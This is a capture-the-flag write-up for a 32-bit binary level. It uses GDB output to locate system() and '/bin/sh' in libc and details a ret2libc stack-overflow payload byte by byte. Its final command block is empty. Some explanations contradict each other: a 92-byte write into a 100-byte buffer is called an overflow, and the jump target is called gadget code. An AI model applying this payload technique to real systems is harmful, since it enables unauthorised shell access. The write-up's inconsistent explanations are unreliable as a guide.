<h1 align="center"> LEVEL 1 </h1>

## 🔍 Analysis of Decompiled [level1](./pseudo.c)
>scp -P 4242 level01@ip:/home/users/level01/level01 .

### The Addresses (found via GDB)
```bash
(gdb) info proc map
process 1960
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fd8000 0xf7fdb000     0x3000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) 

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
(gdb) x system
0xf7e6aed0 <system>:	0x891cec83

```

```
0xf7e6aed0 - system() function address
0xf7f897ec - "/bin/sh" string address
```

The vulnerability is a **stack buffer overflow** in the password input function.

**Breakdown:**
1. `"dat_wil\n"` - **Username** (passes verify_user_name check)
2. `"A"*80` - **Buffer padding** (80 bytes of junk to reach stack frame)
3. `"\xd0\xae\xe6\xf7"` - **Return address 1** (0xf7e6aed0 in little-endian)
4. `"EXIT"` - **Filler** (4 bytes for alignment)
5. `"\xec\x97\xf8\xf7"` - **Return address 2** (0xf7f897ec in little-endian = "/bin/sh")

### How The Exploit Works

1. **Input Phase:**
   - Username: "dat_wil\n" → passes verify_user_name() ✓
   - Password: 92 bytes of payload

2. **Buffer Overflow:**
   - fgets writes 92 bytes into 100-byte buffer
   - **Overwrites the return address on the stack**
   - Return address becomes 0xf7e6aed0

3. **Execution Hijack:**
   - When verify_user_pass() returns
   - Jumps to 0xf7e6aed0 instead of returning normally
   - This address contains gadget code that spawns a shell

### Final Payload Execution

```bash

``` 

- `cat` → keeps stdin open for interactive shell
- Pipe `|` → feeds both into level01
- Result: Interactive shell access! 




